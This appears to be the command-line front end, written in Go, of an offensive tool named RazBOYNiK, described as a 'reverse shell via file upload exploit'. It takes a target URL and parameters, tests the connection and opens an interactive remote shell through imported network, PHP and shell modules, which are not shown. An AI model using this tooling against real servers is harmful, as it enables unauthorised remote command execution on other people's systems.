package app

import (
	"errors"
	"fmt"
	"time"

	"github.com/eatbytes/razboy/core"
	"github.com/eatbytes/razboy/network"
	"github.com/eatbytes/razboy/php"
	"github.com/eatbytes/razboy/shell"
	"github.com/eatbytes/razboynik/bash"
	"github.com/eatbytes/razboynik/modules"
	"github.com/eatbytes/razboynik/services"
	"github.com/fatih/color"
	"github.com/urfave/cli"
)

type AppInterface struct {
	cmd    *cli.App
	server *network.NETWORK
}

func Create() *AppInterface {
	var app *AppInterface

	services.PrintIntro()

	app = &AppInterface{}
	app.createCli()

	return app
}

func (app *AppInterface) createCli() {
	var client *cli.App

	client = cli.NewApp()
	client.Commands = getCommands(app)
	client.Name = "RazBOYNiK"
	client.Usage = "Reverse shell via file upload exploit"
	client.Version = "1.5.0"
	client.Compiled = time.Now()
	client.Authors = []cli.Author{
		cli.Author{
			Name:  "EatBytes",
			Email: "leakleass@protomail.com",
		},
	}
	client.Copyright = "(c) 2016 EatBytes. из России с любовью <3"
	client.EnableBashCompletion = true
	client.BashComplete = func(c *cli.Context) {
		fmt.Fprintf(c.App.Writer, "start\ngenerate\n")
	}

	client.Flags = []cli.Flag{
		cli.BoolFlag{Name: "help, h", Usage: "Help"},
	}

	app.cmd = client
}

func (app *AppInterface) Run(command []string) {
	app.cmd.Run(command)
}

func (app *AppInterface) Help(c *cli.Context) {
	cli.ShowAppHelp(c)
}

func (app *AppInterface) Generate(c *cli.Context) {
	services.PrintGenerating()
}

func (app *AppInterface) Start(c *cli.Context) {
	var cf *core.Config
	var err error

	cf, err = app.GetConfig(c)

	if err != nil {
		services.PrintError(err)
		return
	}

	services.PrintStart()

	err = app.testing(cf)

	if err != nil {
		services.PrintError(err)
		return
	}

	services.PrintSection("Reverse shell", "Reverse shell ready!")

	app.startBash(cf)
}

func (app *AppInterface) testing(cf *core.Config) error {
	var n *network.NETWORK
	var status bool
	var err error

	n, err = network.Create(cf)

	if err != nil {
		return err
	}

	status, err = n.Test()

	if err != nil || status != true {
		return err
	}

	return nil
}

func (app *AppInterface) startBash(cf *core.Config) {
	var n *network.NETWORK
	var s *shell.SHELL
	var p *php.PHP
	var bsh *bash.BashInterface

	n, _ = network.Create(cf)
	p = php.Create(cf)
	s = shell.Create(cf)

	bsh = bash.CreateApp(n, s, p)
	modules.Boot(bsh)
	bsh.Start()
}

func (app *AppInterface) GetConfig(c *cli.Context) (*core.Config, error) {
	var url, parameter, method, key string
	var shmethod int
	var raw bool
	var cf core.Config
	var err error

	url = c.String("u")
	method = c.String("m")
	parameter = c.String("p")
	shmethod = c.Int("s")
	key = c.String("k")
	raw = c.Bool("r")

	if url == "" {
		err = errors.New("Flag -u (url) is required")
		return nil, err
	}

	cf = core.Config{
		url,
		method,
		parameter,
		shmethod,
		key,
		raw,
		false,
	}

	return &cf, nil
}
